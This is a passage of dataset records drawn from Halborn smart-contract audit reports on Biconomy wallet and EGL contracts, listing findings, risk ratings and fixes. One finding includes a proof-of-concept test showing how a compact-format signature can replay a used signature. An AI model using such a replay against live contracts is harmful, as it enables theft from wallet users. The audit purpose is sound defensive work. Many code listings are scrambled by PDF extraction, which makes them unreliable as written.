ECDSA LIBRARY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "A vulnerability found in the ECDSA library developed by the OpenZeppelin team. OpenZeppelin team published a security advisory on GitHub on August 22nd, 2022. According to the vulnerability, recover and tryRecover functions are vulnerable, as those functions accept the standard signature format and compact signature format. (EIP-2098) The functions ECDSA.recover and ECDSA.tryRecover are vulnerable to some sort of signature malleability because they accept compact EIP- 2098 signatures in addition to the traditional 65-byte signature format. This is only an issue for the functions that take a single byte argument, and not the functions that take r, v, s or r, vs as separate arguments. Potentially affected contracts are those that implement signature reuse or replay protection by marking the signature itself as used, rather than the signed message or a nonce included in it. A user can take a signature that has already been submitted, submit it again in a different form, and bypass this protection. Affected Versions >= 4.1.0 < 4.7.3 It was observed that Biconomy contracts were using the vulnerable ECDSA library to recover signatures. 14 Reference: ECDSA Signature Malleability Code Location: Listing 1: package.json (Line 58) 58 \" @openzeppelin / contracts \" : \" ^4.2.0 \" , 59 \" @openzeppelin / contracts - upgradeable \" : \" ^4.7.3 \" , Proof of Concept: The PoC code below proofs that both signatures addresses the same address, as they are identical but in different formats. Listing 2: ECDSA vulnerability test case - PoC UserOperation memory userOp = UserOperation ({ new bytes (0 x0 ) , new bytes (0 x0 ) , sender : user1 , nonce : 0, initCode : callData : callGasLimit : 0, verificationGasLimit : 0 , preVerificationGas : 0, maxFeePerGas : 0, maxPriorityFeePerGas : 0 , paymasterAndData : new bytes (0 x0 ) , signature : new bytes (0 x0 ) 1 function testValidateUserOpPaymaster () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  toEthSignedMessageHash () ); 20 21  signature ); }) ; bytes32 hash = paymentMasterNew . getHash ( userOp ); ( uint8 v , bytes32 r , bytes32 s) = vm . sign (101 , hash . bytes memory signature = abi . encodePacked (r , s , v ); bytes memory paymasterAndData = abi . encodePacked ( user1 , 15 userOp . paymasterAndData = paymasterAndData ; paymentMasterNew . validatePaymasterUserOp ( userOp , bytes32 ( // standart sig : 0 xe34 ... b2a0a094 ...6 c1c // short sig ( to2098format ) : 0 xe34 ... baa0a094 ...6 c 22 23 24 25  uint256 (1) ) , 0) ; // standart signature 26 27 28 29 30  e3402d57abf681838763887091f7d4f bb52 cd03 073a375dd010a1dd0e251f87baa0a0948e6a3579f7b88876286d372aaaf46f2af8e4db9a2a59845130d174a6c  \" ; 31 32 33 34 35 36  uint256 (1) ) , 0) ; // same signature ( eip2098 format ) 37 paymentMasterNew . validatePaymasterUserOp ( userOp , bytes32 ( paymasterAndData = abi . encodePacked ( user1 , shortSig2098 ); userOp . paymasterAndData = paymasterAndData ; bytes memory shortSig2098 = hex \" } Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is suggested to update the version of the @openzeppelin/contracts package version to 4.7.3 to fix this finding. 16 Remediation Plan: SOLVED: @openzeppelin/contracts package version to 4.7.3. Biconomy team solved this The finding Commit ID: b813a60a8475672c2a2d00b7ef5d1839461eaa3e by upgrading the 17 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: High"]}, {"title": "MISSING REENTRANCY GUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. It is also suggested to use call.value method with any Reentrancy pro- tection. Code Location: Listing 3: Functions with missing Reentrancy Guard 1 SmartWallet : handlePayment () 2 SmartWallet : transfer () 3 SmartWalletNoAuth : handlePayment () 4 SmartWalletNoAuth : transfer () 5 EntryPoint : innerHandleOp () 6 StakeManager : withdrawStake () 7 StakeManager : withdrawTo () 8 SimpleWallet : addDeposit () Risk Level: Likelihood - 3 Impact - 2 18 Recommendation: The functions in the code location section are missing nonReentrant modifiers. It is recommended to add the necessary nonReentrant modifier to prevent the introduction of future re-entrancy vulnerabilities. Remediation Plan: PARTIALLY SOLVED: The Biconomy team solved this finding by implementing nonReentrant modifiers to functions in the Code Location section. This finding will not be fixed for Account Abstraction Core contracts, as they are templates. Commit ID: 8624fcf9a92a006a2fc6bad7bb9f834ab3641ffe 19 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Low"]}, {"title": "POSSIBLE INTEGER OVERFLOWS DUE TO IMPROPER USE OF UNCHECKED KEYWORD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As of version 0.8.0 in Solidity, a control mechanism was implemented to prevent overflow and underflow issues for mathematical operations. Since this costs extra gas, the unchecked keyword was also implemented to remove this extra control mechanism for specific code locations. This keyword should be used with caution to benefit from gas consumption. Otherwise, overflows/underflows for mathematical operations can occur. Code Location: Listing 4: EntryPoint.sol (Line 264) 259 function _getRequiredPrefund ( MemoryUserOp memory mUserOp ) internal  view returns ( uint256 requiredPrefund ) { 260 261 unchecked { // when using a Paymaster , the verificationGasLimit is used  also to as a limit for the postOp call . 262 263 264 // our security model might call postOp eventually twice uint256 mul = mUserOp . paymaster != address (0) ? 3 : 1; uint256 requiredGas = mUserOp . callGasLimit + mUserOp .  verificationGasLimit * mul + mUserOp . preVerificationGas ; 265 266 267  ; 268 } // TODO : copy logic of gasPrice ? requiredPrefund = requiredGas * getUserOpGasPrice ( mUserOp ) Listing 5: EntryPoint.sol (Line 455) 442 function _handlePostOp ( uint256 opIndex , IPaymaster . PostOpMode mode  , UserOpInfo memory opInfo , bytes memory context , uint256  actualGas ) private returns ( uint256 actualGasCost ) { 20 443 444 445 446 447 448 449 450 451 452 453 454 455 456  { 457 uint256 preGas = gasleft () ; unchecked { address refundAddress ; MemoryUserOp memory mUserOp = opInfo . mUserOp ; uint256 gasPrice = getUserOpGasPrice ( mUserOp ); address paymaster = mUserOp . paymaster ; if ( paymaster == address (0) ) { refundAddress = mUserOp . sender ; } else { refundAddress = paymaster ; if ( context . length > 0) { actualGasCost = actualGas * gasPrice ; if ( mode != IPaymaster . PostOpMode . postOpReverted ) IPaymaster ( paymaster ). postOp { gas : mUserOp .  verificationGasLimit }( mode , context , actualGasCost ); 458 459 460 } else { // solhint - disable - next - line no - empty - blocks try IPaymaster ( paymaster ). postOp { gas : mUserOp  . verificationGasLimit }( mode , context , actualGasCost ) {} catch Error ( string memory reason ) { revert FailedOp ( opIndex , paymaster , reason } catch { revert FailedOp ( opIndex , paymaster , \" 461 462  ); 463 464 465  postOp revert \" ); 466 467 468 469 } } } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider removing unchecked keyword for the multiply operations above. 21 Remediation Plan: SOLVED: The Biconomy team solved this finding by removing the unchecked keywords directly from the above functions. That eliminates the risk of overflow. Commit ID: e3080c259a580b3ddc205776a2aeca999850b0c0 22 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Low"]}, {"title": "SINGLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "A two-step procedure for changing roles in the contract is missing. If the address is incorrect, the new address will assume the functionality of the new role directly. There is no way to recover these roles back after these types of errors. Code Location: Listing 6: SmartWallet.sol (Line 103) 100 function setOwner ( address _newOwner ) external mixedAuth { 101 require ( _newOwner != address (0) , \" Smart Account :: new  Signatory address cannot be zero \"); 102 103 104 105 } address oldOwner = owner ; owner = _newOwner ; emit EOAChanged ( address ( this ) , oldOwner , _newOwner ); Listing 7: SmartWalletNoAuth.sol (Line 103) 100 function setOwner ( address _newOwner ) external mixedAuth { 101 require ( _newOwner != address (0) , \" Smart Account :: new  Signatory address cannot be zero \"); 102 103 104 105 } address oldOwner = owner ; owner = _newOwner ; emit EOAChanged ( address ( this ) , oldOwner , _newOwner ); Listing 8: BasePaymaster.sol (Line 63) 61 function _transferOwnership ( address newOwner ) internal virtual { 62 63 64 address oldOwner = owner ; owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); 23 65 } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is suggested to add two-step ownership change for the specified con- tracts above. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding. It has been decided to continue with the one-step ownership change pattern. 24 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "These functions are missing address validations. Biconomy Smart Wallet contracts have address fields in multiple func- tions. Each address should be validated and checked to be non-zero. This is also considered a best practice. During testing, it has been found that some of these inputs are not protected against using address(0) as the destination address. Code Location: Listing 9: Missing zero address checks - Variables 1 StakeManager . withdrawStake ( address ). withdrawAddress 2 StakeManager . withdrawTo ( address , uint256 ). withdrawAddress 3 VerifyingPaymasterFactory . deployVerifyingPaymaster ( address , address  , IEntryPoint ). owner 4 VerifyingPaymasterFactory . deployVerifyingPaymaster ( address , address  , IEntryPoint ). verifyingSigner 5 VerifyingPaymaster . init ( IEntryPoint , address , address ).  _verifyingSigner 6 VerifyingPaymaster . init ( IEntryPoint , address , address ). _owner 7 VerifyingPaymaster . setSigner ( address ). _newVerifyingSigner 8 VerifyingPaymaster . init ( IEntryPoint , address , address ).  _verifyingSigner 9 VerifyingPaymaster . init ( IEntryPoint , address , address ). _owner 10 VerifyingPaymaster . setSigner ( address ). _newVerifyingSigner 11 StakeManager . withdrawStake ( address ). withdrawAddress 12 StakeManager . withdrawTo ( address , uint256 ). withdrawAddress 13 BasePaymaster . setEntryPoint ( IEntryPoint ). _entryPoint 25 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. Remediation Plan: SOLVED: The Biconomy team solved this finding by adding require checks to prevent the use of zero addresses. Commit ID: 10d3933d5b9a461b85aebb9343e92ed94ac74970 26 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The requiredTxGas function was declared to return uint256 as a return variable after a successful call. That function calls execute() function, and that function was designed to return bool, not uint256. Therefore, it does not return any variables at all. It is important to validate these return variables. In this case, calling these functions can break any integrations or composability. Code Location: Listing 10: SmartWalletNoAuth.sol (Line 362) 357 function requiredTxGas ( 358 359 360 361 362 363 address to , uint256 value , bytes calldata data , Enum . Operation operation ) external returns ( uint256 ) { // We don 't provide an error message here , as we use it to  return the estimate 364 365 } require ( execute (to , value , data , operation , gasleft () )); Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider returning an uint256 value for the function above. 27 Remediation Plan: SOLVED: The Biconomy team solved this finding by removing the return variable from the requiredTxGas function. Commit ID: 508c44ed749f7c4b06e704d6f6b4e13db9099634 28 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have Locking the pragma helps to ensure that been tested with thoroughly. contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. During the audit, it has seen all contracts use ^0.8.0 as pragma version. Risk Level: Likelihood - 2 Impact - 1 Recommendation: Consider locking the pragma version with known bugs for the compiler version by removing the caret (^) symbol. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 29 Remediation Plan: SOLVED: This finding was solved by updating the Solidity version from ^0.8.0 to 0.8.12. All caret symbols have been removed from these con- tracts. Commit ID: 3b882439d3981db3b1c992fefa18e4b0f80746d4 30 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Informational"]}, {"title": "FOR LOOPS CAN BE OPTIMIZED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been observed all for loops in the protocol were not optimized properly. Having not optimized for loops can cost too much gas usage. These for loops can be optimized with suggestions above: 1. In Solidity (pragma 0.8.0 and later), adding unchecked keyword for arithmetical operations can reduce gas usage on contracts where underflow/underflow is unrealistic. It is possible to save gas by using this keyword on multiple code locations. 2. In all for loops, the index variable is incremented using +=. It is known that, in loops, using ++i costs less gas per iteration than +=. This also affects incremented variables within the loop code block. 3. Do not initialize index variables with 0, Solidity already initial- izes these uint variables as zero. Check the Recommendation section for further details. Code Location: Listing 11: Optimizable For Loops - LoC list 1 core / EntryPoint . sol : # L81 2 core / EntryPoint . sol : # L87 3 core / EntryPoint . sol : # L107 4 core / EntryPoint . sol : # L119 5 core / EntryPoint . sol : # L140 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to apply the following pattern for Solidity pragma version 0.8.0 and later. Listing 12: Possible Suggestion . . . unchecked { 1 for ( uint256 i ; i < arrayLength ; ) { 2 3 4 5 ++ i } Remediation Plan: SOLVED: The Biconomy team solved the issue by optimizing these for loops as per the suggestion above. Commit ID: 0dc8ee23591fd54318abdd8d892ab84958847cd0 32 ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Informational"]}, {"title": "USE DECLARED FUNCTION INSTEAD OF MSG.SENDER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The BasePaymaster contract uses a modifier to control functions are The other onlyOwner modifier uses called by EntryPoint address. However, the _msgSender() function to return msg.sender address. _requireFromEntryPoint modifier uses msg.sender directly. Only one of these pattern should be used to increase readability. Code Location: Listing 13: BasePaymaster.sol (Line 143) 142 function _requireFromEntryPoint () internal virtual { 143 144 require ( msg . sender == address ( entryPoint )) ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider _msgSender() _requireFromEntryPoint modifier as below. removing the function or change the Listing 14: BasePaymaster.sol - Possible Fix 1 function _requireFromEntryPoint () internal virtual { 2 3 require ( _msgSender () == address ( entryPoint )) ; } 33 Remediation Plan: SOLVED: The Biconomy team solved this finding by replacing the msg.sender to _msgSender() function. Commit ID: f44e1592bbaa90569fd10f4418a4534fa7ff2acd 34 3.10 (HAL-10) IMMUTABLE KEYWORD COSTS LESS GAS FOR CONSTANT VARIABLES - INFORMATIONAL ", "labels": ["Halborn", "Biconomy_Smart_Wallet_Contracts_V2", "Severity: Informational"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in the EglContract.sol. Code Location: EglContract.sol Line #968 Listing 1: EglContract.sol (Lines ) 968 proximityRewardPercent = uint ( actualDelta . mul ( int ( DECIMAL_PRECISION )) . div ( eglDelta )) . mul (75) ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: ACKNOWLEDGED: actualDelta is multiplied by DECIMAL_PRECISION before being divided by eglDelta, then the precision is maintained by EGL Team. 13 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "LACK OF MULTIPLE VOTING CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the vote progress, the pre-condition checks are not applied on the function. Although _internalVote function prevents to multiple votes, the initial checks should complete at the beginning of the function. Code Location: EglContract.sol Line #968 Listing 2: EglContract.sol (Lines ) 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { external whenNotPaused require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 0 14 498 499 ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: The initial checks should complete through require() function. The sample solution can be seen below. Listing 3: EglContract.sol (Lines 9) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused { require ( voters [ msg . sender ]. tokensLocked == 0 , \" EGL : ALREADY_VOTED \" ); require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 15 22 23 24 } 0 ); Remediation Plan: SOLVED: Validations were completed in the internal function by EGL Team. 16 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "LACK OF ACCESS CONTROL ON THE MANAGEMENT PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the MockEglGenesis contract, canWithdraw and canContribute variable is defined as a public function. These function could be called by anyone. Although, the contract named as MockEglGenesis, the modifier should add at the beginning of the function. Code Location: MockEglGenesis.sol Line #33-39 Listing 4: MockEglGenesis.sol (Lines 33,37) 33 34 35 36 37 38 39 function setCanContribute ( bool _canContribute ) external { canContribute = _canContribute ; } function setCanWithdraw ( bool _canWithdraw ) external { canWithdraw = _canWithdraw ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommend to add onlyOwner modifier at the beginning of the function. Example remediated code can be seen below. 17 Listing 5: RemediatedMockEglGenesis.sol (Lines 33,37) 33 function setCanContribute ( bool _canContribute ) external onlyOwner { } canContribute = _canContribute ; 34 35 36 37 function setCanWithdraw ( bool _canWithdraw ) external onlyOwner { 38 39 canWithdraw = _canWithdraw ; } Remediation Plan: NOT APPLICABLE: The mock-up contracts are added only for testing purpose. 18 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the EGL, The contracts are using block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: EglContract.sol Line #33-39 Listing 6: EglContract.sol (Lines 392) 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 function claimSupporterEgls ( uint _gasTarget , uint8 _lockupDuration ) external whenNotPaused { require ( remainingSupporterBalance > 0, \" EGL : SUPPORTER_EGLS_DEPLETED \" ); require ( remainingBptBalance > 0, \" EGL : BPT_BALANCE_DEPLETED \" ); require ( eglGenesis . canContribute () == false && eglGenesis . canWithdraw () == false , \" EGL : GENESIS_LOCKED \" ); require ( supporters [ msg . sender ]. claimed == 0 , \" EGL : ALREADY_CLAIMED \" ); ( uint contributionAmount , uint cumulativeBalance , ,) = eglGenesis . contributors ( msg . sender ); require ( contributionAmount > 0, \" EGL : NOT_CONTRIBUTED \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; ... 19 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: the EGL Team considers safe the usage of block.timestamp because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could occur with Ethereum 2.0 upgrades or hard forks. Use of oracles would create a dependency on the health of a third party service and potentially incur additional fees. 20 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the EglContract contract, the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator It logs its emitted about the actions taken by the called function. parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. EglContract.sol Line #~542 Listing 7: EglContract.sol (Lines 542) 542 543 544 545 546 function withdraw () external whenNotPaused { require ( voters [ msg . sender ]. tokensLocked > 0, \" EGL : NOT_VOTED \" ); require ( block . timestamp > voters [ msg . sender ]. releaseDate , \" EGL : NOT_RELEASE_DATE \" ); eglToken . transfer ( msg . sender , _internalWithdraw ( msg . sender )); } EglContract.sol Line #~640 Listing 8: EglContract.sol (Lines ) 640 641 642 643 644 645 646 647 648 649 function pauseEgl () external onlyOwner whenNotPaused { _pause () ; } /* * * @notice Owner only function to unpause contract */ function unpauseEgl () external onlyOwner whenPaused { _unpause () ; } 21 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: The Withdraw event is now emitted from the internal withdraw function, as well as Pause and Unpause events are emitted from the parent functions. 22 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the EglContract.sol contract, there are a few instances where the multiple methods are called and the return value (bool) is ignored. Code Location: EglContract.sol Line #~491,522,545,560,631,915 Listing 9: EglContract.sol (Lines 491) eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); 491 492 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. As an other Return value checks provide better exception handling. solution, Use SafeERC20 on the both networks when possible and ensure that the transfer/transferFrom return value is checked. A custom function named safeTransferFrom can be implemented that checks the return value of the transferFrom function and makes sure that the funds were transferred. 23 Remediation Plan: SOLVED: The return values are now checked on the transferFrom function. Listing 10: EglContract.sol (Lines ) 491 492 bool success = eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); require ( success , \" EGL : TOKEN_TRANSFER_FAILED \"); 24 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Low"]}, {"title": "USE OF ASSERT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the solidity, assert() and require() functions are used for protecting contract on the unexceptional behaviours. With the assert() function, it is not possible to evaluate return value. Code Location: EglContract.sol Line #802 Listing 11: EglContract.sol (Lines 802) 795 796 797 798 799 800 801 802 803 804 function _internalVote ( address _voter , uint _gasTarget , uint _eglAmount , uint8 _lockupDuration , uint _releaseTime ) internal { assert ( _voter != address (0) ) ; ... } EglContract.sol Line #1049 Listing 12: EglContract.sol (Lines 1049) 1039 1040 1041 1042 1043 1044 1045 1046 1047 function _calculateCurrentPoolTokensDue ( uint _currentEgl , uint _firstEgl , uint _lastEgl , uint _totalPoolTokens ) internal pure returns ( uint poolTokensDue ) 25 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 { } assert ( _firstEgl < _lastEgl ); if ( _currentEgl < _firstEgl ) return 0; uint eglsReleased = ( _currentEgl . umin ( _lastEgl )) . sub ( _firstEgl ); poolTokensDue = _totalPoolTokens . mul ( eglsReleased ) . div ( _lastEgl . sub ( _firstEgl ) ); EglContract.sol Line #1077 Listing 13: EglContract.sol (Lines 1077) 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 function _calculateBonusEglsDue ( uint _firstEgl , uint _lastEgl ) { } internal pure returns ( uint bonusEglsDue ) assert ( _firstEgl < _lastEgl ); bonusEglsDue = ( _lastEgl . div ( DECIMAL_PRECISION ) **4) . sub ( _firstEgl . div ( DECIMAL_PRECISION ) **4) . mul ( DECIMAL_PRECISION ) . div ( (81/128) *(10**27) ); EglContract.sol Line #1107 26 Listing 14: EglContract.sol (Lines 1107) 1097 1098 1099 1100 1101 1102 1103 1104 1105 1106 1107 1108 1109 function _calculateVoterReward ( address _voter , uint16 _currentEpoch , uint16 _voterEpoch , uint8 _lockupDuration , uint _voteWeight internal returns ( uint rewardsDue ) assert ( _voter != address (0) ) ; ... ) { } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use require() function instead of assert() function. This change will improve code readability. The example code snippet can be seen below. Listing 15: EglContract.sol (Lines 802) 795 796 797 798 799 800 801 802 803 804 function _internalVote ( address _voter , uint _gasTarget , uint _eglAmount , uint8 _lockupDuration , uint _releaseTime ) internal { require ( _voter != address (0) ,\" EGL : VOTER_COULD_NOT_BE_ZERO_ADDRESS \" ); ... } 27 Remediation Plan: SOLVED: The assert() function is replaced by require() function on the related statements. Listing 16: EglContract.sol (Lines 802) 1114 1115 1116 1117 1118 1119 1120 1121 1122 1123 1124 function _calculateVoterReward ( address _voter , uint16 _currentEpoch , uint16 _voterEpoch , uint8 _lockupDuration , uint _voteWeight internal returns ( uint rewardsDue ) ) { require ( _voter != address (0) , \" EGL : VOTER_ADDRESS_0 \" ); 28 ", "labels": ["Halborn", "EGL_EglContract", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the vote and re-vote functions with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against Reentrancy attacks. Code Location: Listing 17: EglContract.sol (Lines 491) 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { external whenNotPaused require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 29 497 498 499 } 0 ); Listing 18: EglContract.sol (Lines 522) 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 function reVote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { } external whenNotPaused require ( voters [ msg . sender ]. tokensLocked > 0, \" EGL : NOT_VOTED \" ); if ( _eglAmount > 0) { require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \"); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \"); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \" ); eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); } if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; uint originalReleaseDate = voters [ msg . sender ]. releaseDate ; _eglAmount = _eglAmount . add ( _internalWithdraw ( msg . sender )) ; _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , originalReleaseDate ); emit ReVote ( msg . sender , _gasTarget , _eglAmount , now ); 30 Recommendation: In the EglContract.sol contract, the vote() and reVote() functions are missing nonReentrant guard. Use the nonReentrant modifier to avoid in- troducing future vulnerabilities. Remediation Plan: SOLVED: The re-entrancy 